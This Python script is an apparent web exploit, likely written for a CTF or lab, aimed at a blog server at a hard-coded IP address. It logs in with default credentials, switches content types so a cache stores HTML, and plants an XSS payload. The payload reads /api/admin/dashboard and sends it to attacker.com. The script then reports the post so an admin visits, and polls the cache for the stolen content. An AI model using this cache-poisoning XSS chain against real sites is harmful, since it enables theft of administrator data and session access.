import requests
import time

SERVER_URL = "http://54.198.62.41"

def login_user(username="user", password="user123"):
    """Login and get token"""
    login_data = {
        "username": username,
        "password": password
    }
    r = requests.post(f"{SERVER_URL}/api/auth/login", json=login_data)
    return r.json()['token']

def test_content_switching():
    user_token = login_user()
    print(f"[+] Got user token: {user_token[:20]}...")

    print("\n=== Testing Content-Type Switching ===")

    # Test 1: Normal JSON request (baseline)
    print("\n[1] Normal JSON request:")
    json_headers = {
        'Authorization': f'Bearer {user_token}',
        'X-Special-Key': 'secret_cache_key',
        'Accept': 'application/json'
    }
    r1 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=json_headers)
    print(f"Status: {r1.status_code}")
    print(f"Content-Type: {r1.headers.get('Content-Type')}")
    print(f"Response preview: {r1.text[:200]}")

    # Test 2: HTML request
    print("\n[2] HTML request:")
    html_headers = {
        'Authorization': f'Bearer {user_token}',
        'X-Special-Key': 'secret_cache_key',
        'Accept': 'text/html'
    }
    r2 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=html_headers)
    print(f"Status: {r2.status_code}")
    print(f"Content-Type: {r2.headers.get('Content-Type')}")
    print(f"Response preview: {r2.text[:200]}")
    print(f"Response different from JSON: {r1.text != r2.text}")

    # Test 3: Verify caching of HTML content
    print("\n[3] Verifying HTML content cache:")
    time.sleep(1)
    r3 = requests.get(
        f"{SERVER_URL}/api/blog/post/1",
        headers={'X-Special-Key': 'secret_cache_key', 'Accept': 'text/html'}
    )
    print(f"Status: {r3.status_code}")
    print(f"Cache: {r3.headers.get('X-Cache-Debug')}")
    print(f"Content-Type: {r3.headers.get('Content-Type')}")
    print(f"Cache working: {r2.text == r3.text}")

    # Test 4: Try XSS payload
    print("\n[4] Testing XSS payload:")
    xss_headers = {
        'Authorization': f'Bearer {user_token}',
        'X-Special-Key': 'secret_cache_key',
        'Accept': 'text/html',
        'Content-Type': 'text/html'
    }
    xss_payload = '<img src=x onerror="fetch(\'/api/admin/dashboard\').then(r=>r.text()).then(t=>fetch(\'http://attacker.com?token=\'+btoa(t)))">'
    
    # Try to inject XSS through different methods
    test_paths = [
        f"{SERVER_URL}/api/blog/post/1",
        f"{SERVER_URL}/api/blog/post/1?inject={xss_payload}",
        f"{SERVER_URL}/api/blog/post/1#{xss_payload}"
    ]

    for path in test_paths:
        print(f"\nTrying path: {path}")
        r = requests.get(path, headers=xss_headers)
        print(f"Status: {r.status_code}")
        print(f"Content-Type: {r.headers.get('Content-Type')}")
        print(f"Response contains <img: {'<img' in r.text}")
        print(f"Response preview: {r.text[:200]}")

        # Verify cache
        time.sleep(1)
        verify = requests.get(
            path, 
            headers={'X-Special-Key': 'secret_cache_key', 'Accept': 'text/html'}
        )
        print(f"\nCache verification:")
        print(f"Cache: {verify.headers.get('X-Cache-Debug')}")
        print(f"Content-Type: {verify.headers.get('Content-Type')}")
        print(f"XSS payload in cache: {'<img' in verify.text}")

    # Test 5: Report post to trigger admin visit
    print("\n[5] Triggering admin visit:")
    report_data = {"postId": 1}
    r = requests.post(
        f"{SERVER_URL}/api/blog/report",
        headers={'Authorization': f'Bearer {user_token}'},
        json=report_data
    )
    print(f"Report status: {r.status_code}")

    # Monitor cache for a few seconds
    print("\nMonitoring cache for admin visit...")
    start_time = time.time()
    seen_responses = set()

    while time.time() - start_time < 10:
        r = requests.get(
            f"{SERVER_URL}/api/blog/post/1",
            headers={'X-Special-Key': 'secret_cache_key', 'Accept': 'text/html'}
        )
        content = r.text
        if content not in seen_responses:
            print("\nNew response found!")
            print(f"Content-Type: {r.headers.get('Content-Type')}")
            print(f"Length: {len(content)}")
            print(f"Preview: {content[:200]}")
            seen_responses.add(content)
        time.sleep(0.5)

if __name__ == "__main__":
    print("[+] Starting content-type switching test...")
    test_content_switching()